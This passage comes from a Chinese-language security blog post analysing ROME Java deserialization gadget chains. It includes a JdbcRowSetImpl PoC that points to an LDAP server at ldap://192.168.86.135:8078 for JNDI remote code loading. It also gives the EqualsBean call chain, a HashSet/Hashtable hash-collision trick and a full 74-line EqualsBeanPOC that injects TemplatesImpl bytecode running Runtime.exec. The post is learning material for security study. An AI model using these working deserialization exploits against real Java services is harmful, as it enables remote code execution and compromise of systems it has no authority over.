class="hljs-keyword">throws</span> Exception&#123;<br><br><br>        JdbcRowSetImpl JRSI=<span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        JRSI.setDataSourceName(<span class="hljs-string">&quot;ldap://192.168.86.135:8078/BkooPVXv&quot;</span>);<br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(JdbcRowSetImpl.class,JRSI);<br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">objectBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class, toStringBean);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(objectBean, <span class="hljs-string">&quot;x&quot;</span>);<br>        setFieldValue(objectBean, <span class="hljs-string">&quot;_cloneableBean&quot;</span>, <span class="hljs-literal">null</span>);<br>        setFieldValue(objectBean, <span class="hljs-string">&quot;_toStringBean&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bs</span> <span class="hljs-operator">=</span> unSerial(hashMap);<br>        <span class="hljs-comment">// 输出序列化的Base64编码字符</span><br>        Base64Encode(bs);<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ByteArrayOutputStream <span class="hljs-title function_">unSerial</span><span class="hljs-params">(Map hashMap)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bs</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bs);<br>        out.writeObject(hashMap);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bs.toByteArray()));<br>        in.readObject();<br>        in.close();<br>        <span class="hljs-keyword">return</span> bs;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Base64Encode</span><span class="hljs-params">(ByteArrayOutputStream bs)</span>&#123;<br>        <span class="hljs-type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(encode);<br>        System.out.println(s);<br>        System.out.println(s.length());<br>    &#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h2 id="0x06-EqualsBean链"><a href="#0x06-EqualsBean链" class="headerlink" title="0x06 EqualsBean链"></a>0x06 EqualsBean链</h2><p>上文我们第一次分析 ObjectBean 链的时候就途径 EqualsBean， 其实 EqualsBean 本身就能够当作和 toStringBean 一类的最终触发点，这里只不过要想调用 get 方法需要通过其 beanEquals 方法<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711887018145-0ca29033-6849-4ae2-b5bb-269e2037a930.png#averageHue=%232b2e33&clientId=u9f9b8bcd-7272-4&from=paste&height=251&id=uf3f50569&originHeight=470&originWidth=1453&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=217087&status=done&style=none&taskId=u34e9a0ee-093c-4380-b7f3-b6342f58d49&title=&width=774.9333333333333'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711887018145-0ca29033-6849-4ae2-b5bb-269e2037a930.png#averageHue=%232b2e33&clientId=u9f9b8bcd-7272-4&from=paste&height=251&id=uf3f50569&originHeight=470&originWidth=1453&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=217087&status=done&style=none&taskId=u34e9a0ee-093c-4380-b7f3-b6342f58d49&title=&width=774.9333333333333" referrerpolicy="no-referrer" alt="image.png"></p>
<h3 id="1x01-流程分析-1"><a href="#1x01-流程分析-1" class="headerlink" title="1x01 流程分析"></a>1x01 流程分析</h3><p>equalsBean 的组件分析文章开头分析过了，这里就直接分析攻击链了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">HashSet.readObject<br>HashMap.put<br>HashMap.putval<br>HashMap.equals<br>AbastractMap.equals<br>EqualsBean.equals<br>EqualsBean.beanEquals<br>TemplatesImpl.getOutputProperties()<br></code></pre></td></tr></table></figure>
<p>其实这里 HashSet 也算是一个新的入口点，对于EqualsBean 方向的攻击来说，只要能够触发到 equals 方法，我们都能接着往下走，所以前面还能换成</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">HashTable.readObject(ObjectInputStream)<br>HashTable.reconstitutionPut()<br>HashMap.equals<br>AbastractMap.equals<br>EqualsBean.equals<br>EqualsBean.beanEquals<br>TemplatesImpl.getOutputProperties()<br></code></pre></td></tr></table></figure>
<p>hashtable 的 hash 碰撞就不讲了，但是 hashset 的处理方式要讲一下，跟 hashtable 的 hash 碰撞差不多，都是利用 yy zZ 两个字符串算出来的 hash 值相同</p>
<h4 id="2x01-hashSet-分析"><a href="#2x01-hashSet-分析" class="headerlink" title="2x01 hashSet 分析"></a>2x01 hashSet 分析</h4><p>我们来到它的 readObject 方法相关的 for 循环<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711893479163-ac99e55f-da5f-463c-9dfe-a194d87d0020.png#averageHue=%232c2f33&clientId=u9f9b8bcd-7272-4&from=paste&height=148&id=u34b2d9e5&originHeight=277&originWidth=1021&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=79634&status=done&style=none&taskId=u36d2ef01-0d01-4dc0-a2d5-e00203883a1&title=&width=544.5333333333333'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711893479163-ac99e55f-da5f-463c-9dfe-a194d87d0020.png#averageHue=%232c2f33&clientId=u9f9b8bcd-7272-4&from=paste&height=148&id=u34b2d9e5&originHeight=277&originWidth=1021&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=79634&status=done&style=none&taskId=u36d2ef01-0d01-4dc0-a2d5-e00203883a1&title=&width=544.5333333333333" referrerpolicy="no-referrer" alt="image.png"><br>这里 map 默认会被赋值为 hashmap，所以之后会调用 hashmap 的 put 方法<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711893529777-147a23db-c6bf-4412-8333-d5fb82e0b192.png#averageHue=%232d3034&clientId=u9f9b8bcd-7272-4&from=paste&height=94&id=u23479a3a&originHeight=177&originWidth=1322&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=83201&status=done&style=none&taskId=uca6d7323-5e53-4a57-9003-d3af67a2613&title=&width=705.0666666666667'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711893529777-147a23db-c6bf-4412-8333-d5fb82e0b192.png#averageHue=%232d3034&clientId=u9f9b8bcd-7272-4&from=paste&height=94&id=u23479a3a&originHeight=177&originWidth=1322&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=83201&status=done&style=none&taskId=uca6d7323-5e53-4a57-9003-d3af67a2613&title=&width=705.0666666666667" referrerpolicy="no-referrer" alt="image.png"><br>熟悉的调用 putval，第一次进由于缓存 tab 里面没有值，所以第一次 if 判断 p 是否为空是一定满足不了的<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711893572688-562a7874-a979-4849-8a30-9126a3f78439.png#averageHue=%232c2f33&clientId=u9f9b8bcd-7272-4&from=paste&height=313&id=u53e1767c&originHeight=586&originWidth=1405&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=253812&status=done&style=none&taskId=u789240af-6271-4307-9d99-d74145df717&title=&width=749.3333333333334'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711893572688-562a7874-a979-4849-8a30-9126a3f78439.png#averageHue=%232c2f33&clientId=u9f9b8bcd-7272-4&from=paste&height=313&id=u53e1767c&originHeight=586&originWidth=1405&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=253812&status=done&style=none&taskId=u789240af-6271-4307-9d99-d74145df717&title=&width=749.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>所以这里我们可能考虑要 hashset add 两次 equalsbean，不然第二次进入 putval 会报空错。<br>想要调用到 equals 方法，if 判断条件中，第一个判断<code>p.hash == hash</code>也必须过，这里如果是直接 add 两个equalsbean 就不用管，算出来肯定一样（但是后续就要考虑和 hashtable 同样的 hash 碰撞了）<br>第二次进入之后，顺利来到下面的这层判断，准备触发 equals</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (p.hash == hash &amp;&amp;((k = p.key) == key || (key != <span class="hljs-literal">null</span> &amp;&amp; key.equals(k))))<br></code></pre></td></tr></table></figure>
<p>如果我们刚才直接给 hashset add 进 equalsbean ，其中传入 equals 方法的参数 k 还是 equalsbean，这也不行，我们考虑其中加一层 hashmap 来包裹 equalsbean</p>
<p>hashmap 的 equals 方法会调用到它的抽象类 Abstractmap 的 equals 方法，在它的 quals 方法中，他首先会通过 Iterator 迭代器，对我们当前 hashmap 作用，能够访问到当前 hashmap 的各个键值对。<br>这里就是调用了 next 方法，取第二个键值对(假设此时键值对&lt;a,a&gt; &lt;b,b&gt;) &lt;b,b&gt;，然后取出它的 key 和 value，各为 b。然后这里调用 b 的 equals 方法，参数是 m 的键值 value，m 是什么？上面代码中制定了 m 是我们当前的 hashmap。key 是我们刚才取出的 b，也就是说，它会在两个 hashmap 中相互取值，这里比较绕，我们之后看 POC 能明白些<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711893997609-679aa67c-37d9-4a6c-8043-905661e7dc52.png#averageHue=%232d3139&clientId=u9f9b8bcd-7272-4&from=paste&height=259&id=NMqob&originHeight=485&originWidth=1750&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=264352&status=done&style=none&taskId=ufad6fc35-9678-47b0-a6fc-0aaf0f756e7&title=&width=933.3333333333334'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711893997609-679aa67c-37d9-4a6c-8043-905661e7dc52.png#averageHue=%232d3139&clientId=u9f9b8bcd-7272-4&from=paste&height=259&id=NMqob&originHeight=485&originWidth=1750&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=264352&status=done&style=none&taskId=ufad6fc35-9678-47b0-a6fc-0aaf0f756e7&title=&width=933.3333333333334" referrerpolicy="no-referrer" alt="image.png"></p>
<h4 id="2x02-攻击流程分析"><a href="#2x02-攻击流程分析" class="headerlink" title="2x02 攻击流程分析"></a>2x02 攻击流程分析</h4><p>上述难关通关后，就可以正常调用链了，如果思路没错的话，我们直接看 POC，经测试，不论是 hashtable 还是 hashset 都能够这么用，各自的条件都已经注释好了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EqualsBeanPOC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;i&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);<br>        ctClass.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ctClass.makeClassInitializer();<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(String.class, <span class="hljs-string">&quot;s&quot;</span>);<br>        <span class="hljs-comment">//EqualsBean bean2 =new EqualsBean(String.class, &quot;s&quot;);</span><br><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map1.put(<span class="hljs-string">&quot;yy&quot;</span>, bean);<br>        map1.put(<span class="hljs-string">&quot;zZ&quot;</span>, templatesImpl);<br>        map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, bean);<br>        map2.put(<span class="hljs-string">&quot;yy&quot;</span>, templatesImpl);<br>        <span class="hljs-comment">//Hashtable hashtable =new Hashtable();</span><br>        HashSet hashSet=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>        hashSet.add(map1);<br>        hashSet.add(map2);<br>        <span class="hljs-comment">//hashtable.put(map1,&quot;1&quot;);</span><br>        <span class="hljs-comment">//hashtable.put(map2,&quot;2&quot;);</span><br>        setFieldValue(bean, <span class="hljs-string">&quot;_beanClass&quot;</span>, Templates.class);<br>        setFieldValue(bean, <span class="hljs-string">&quot;_obj&quot;</span>, templatesImpl);<br>        unSerial(hashSet);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ByteArrayOutputStream <span class="hljs-title function_">unSerial</span><span class="hljs-params">(Object hashMap)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bs</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bs);<br>        out.writeObject(hashMap);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bs.toByteArray()));<br>        in.readObject();<br>        in.close();<br>        <span class="hljs-keyword">return</span> bs;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Base64Encode</span><span class="hljs-params">(ByteArrayOutputStream bs)</span>&#123;<br>        <span class="hljs-type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(encode);<br>        System.out.println(s);<br>        System.out.println(s.length());<br>    &#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>断点打在 readObject，跟进，然后顺利的来到 for 循环，第一次进 putval 肯定是不能够触发后续链的，但他会先给缓存 tab 赋值，把第一个 hashmap 存入进去<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711898247072-076a4ec5-3002-4bd0-94dd-2c6e0818c9a1.png#averageHue=%232e343d&clientId=u9f9b8bcd-7272-4&from=paste&height=214&id=ue2c62fdb&originHeight=402&originWidth=1670&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=201366&status=done&style=none&taskId=u405cc488-2064-4668-8493-3dec5ed7040&title=&width=890.6666666666666'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711898247072-076a4ec5-3002-4bd0-94dd-2c6e0818c9a1.png#averageHue=%232e343d&clientId=u9f9b8bcd-7272-4&from=paste&height=214&id=ue2c62fdb&originHeight=402&originWidth=1670&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=201366&status=done&style=none&taskId=u405cc488-2064-4668-8493-3dec5ed7040&title=&width=890.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>我们直接跟进第二次 putval，此时两段 hash 算出来肯定是一样的，我们只需关注 key 值和 k 值即可，分别为我们本次循环 put 的 hashmap，以及第一次 put ，被存入 tab 缓存的 hashmap<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711898629888-1c0141e3-69b9-4df5-8e84-7c99d348d22a.png#averageHue=%2333373d&clientId=u9f9b8bcd-7272-4&from=paste&height=650&id=ufc0abded&originHeight=1218&originWidth=1823&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=724805&status=done&style=none&taskId=u2e7a6036-4514-4679-8b3b-eecf856b51b&title=&width=972.2666666666667'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711898629888-1c0141e3-69b9-4df5-8e84-7c99d348d22a.png#averageHue=%2333373d&clientId=u9f9b8bcd-7272-4&from=paste&height=650&id=ufc0abded&originHeight=1218&originWidth=1823&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=724805&status=done&style=none&taskId=u2e7a6036-4514-4679-8b3b-eecf856b51b&title=&width=972.2666666666667" referrerpolicy="no-referrer" alt="image.png"><br>继续跟进 equals 方法<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711898746853-8d85a397-fc7e-4b6d-9495-3eac0c1577d5.png#averageHue=%2333373d&clientId=u9f9b8bcd-7272-4&from=paste&height=702&id=u6fdbd404&originHeight=1317&originWidth=1948&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=812456&status=done&style=none&taskId=u8baa8f5b-5fb1-480d-82c8-17985c071c7&title=&width=1038.9333333333334'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711898746853-8d85a397-fc7e-4b6d-9495-3eac0c1577d5.png#averageHue=%2333373d&clientId=u9f9b8bcd-7272-4&from=paste&height=702&id=u6fdbd404&originHeight=1317&originWidth=1948&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=812456&status=done&style=none&taskId=u8baa8f5b-5fb1-480d-82c8-17985c071c7&title=&width=1038.9333333333334" referrerpolicy="no-referrer" alt="image.png"><br>m 值为我们传入的第一次的 hashmap，i 为关于第二个 hashmap 的迭代器，迭代器第一次初始化取到的键值对默认为空，所以它第一次 next 就是取出我们第二个 hashmap 的第一个键值对，也就是<code>&lt;&quot;zZ&quot;,equalsbean&gt;</code>，所以 key 是 zZ 字符串，value 是创建好的 qualsbean<br>最终 value.equals(m.get(key)) 转化为<code>EqualsBean.equals(templatesImpl)</code><br>后续触发就是正常流程了，EqualsBean 的 equals 方法直接 return beanEquals 处理的结果，所以跟进beanEquals<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711899567246-3ce22e8c-5896-43b1-9a95-1b719a0113a0.png#averageHue=%2333373c&clientId=u9f9b8bcd-7272-4&from=paste&height=564&id=u7b0d8106&originHeight=1057&originWidth=1959&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=653948&status=done&style=none&taskId=u3a553836-a0cc-4694-9d01-3467bd837ff&title=&width=1044.8'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711899567246-3ce22e8c-5896-43b1-9a95-1b719a0113a0.png#averageHue=%2333373c&clientId=u9f9b8bcd-7272-4&from=paste&height=564&id=u7b0d8106&originHeight=1057&originWidth=1959&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=653948&status=done&style=none&taskId=u3a553836-a0cc-4694-9d01-3467bd837ff&title=&width=1044.8" referrerpolicy="no-referrer" alt="image.png"><br>获取完 get 方法之后开始第一次调用，此时调用就是 TemplatesImpl 的 getOutputProperties 方法<br>之后就是加载恶意字节码的流程，不过多赘述</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>用 EqualsBean 的方式去触发链其实不只有 hashset 方法可以作为入口点，以及也不只 templatesImpl 作为最终恶意代码执行的点，它和 ToStringBean 一样，都只是作为攻击链其中的一部分。不过最重要的点还是它两作为 ROME 依赖中组件的特性，就是会调用目标类的 get 方法，这也是存在恶意代码执行的必要条件。<br>我们学习 ROME 链的时候要和 CommonCollections 链联系起来，虽然 CC 是最开始我们学习 java 反序列化的先导，但其实两者是很像的。分析 ROME 链，我最大的感受可能是对 CC 链等依赖中存在的攻击链新的认识，其实就是分析 java 项目中存在哪些依赖，该依赖有没有漏洞点，能不能作为我最终攻击的跳板。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/post/Re_Live.html">← 下一篇 Re_Life</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/post/C3P0%E9%93%BE%E5%88%86%E6%9E%90.html">C3P0攻击链学习 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/logo/D5B030D454D35C3F06BCF706E7F7948A.png" alt="Logo"></a><h1 id="Dr"><a href="/">stoocea</a></h1><div id="description"><p>time thicking away</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-ROME"><span class="toc-number">1.</span> <span class="toc-text">什么是 ROME</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ROME-%E7%BB%84%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">ROME 组件分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-ToStringBean"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 ToStringBean</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-EqualsBean"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 EqualsBean</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ROME-%E9%93%BE%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">ROME 链流程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-ObjectBean%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.1.</span> <span class="toc-text">0x01 ObjectBean利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x01-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.1.1.</span> <span class="toc-text">1x01 流程分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-HashTable%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.2.</span> <span class="toc-text">0x02 HashTable利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-BadAttributeValueExpException"><span class="toc-number">3.3.</span> <span class="toc-text">0x03 BadAttributeValueExpException</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x01-%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.3.1.</span> <span class="toc-text">1x01 调用流程分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-HotSwappableTargetSource-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.4.</span> <span class="toc-text">0x04 HotSwappableTargetSource 利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x01-%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90"><span class="toc-number">3.4.1.</span> <span class="toc-text">1x01  功能分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1x02-%E6%B5%81%E7%A8%8B%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-number">3.4.2.</span> <span class="toc-text">1x02 流程利用分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2x01-hashMap-%E5%85%A5%E5%8F%A3"><span class="toc-number">3.4.2.1.</span> <span 